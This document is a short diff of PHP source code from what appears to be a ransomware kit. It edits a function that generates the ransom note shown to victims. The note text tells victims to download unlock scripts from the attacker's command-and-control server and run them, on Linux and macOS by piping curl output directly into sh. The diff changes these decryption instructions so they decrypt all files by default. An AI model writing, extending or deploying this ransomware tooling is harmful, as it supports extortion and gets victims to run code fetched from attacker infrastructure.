@@ -85,10 +85,10 @@ function build_ransom_note($r, $plat, $c2='') {
     $dec = ($plat === 'win')
         ? "Windows (requires PowerShell 7+)\n"
          ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
-         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\" -Paths C:\\TargetFolder"
+         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\""
         : "Linux / macOS (pure openssl, no dependencies required)\n"
-         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\" <target_folder>\n"
-         ."  (Request the passphrase and target folder from us)";
+         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
+    $dec.= "\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)";
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
     // 标题若已含 ENCRYPT 字样则不再补副标题，避免两行重复
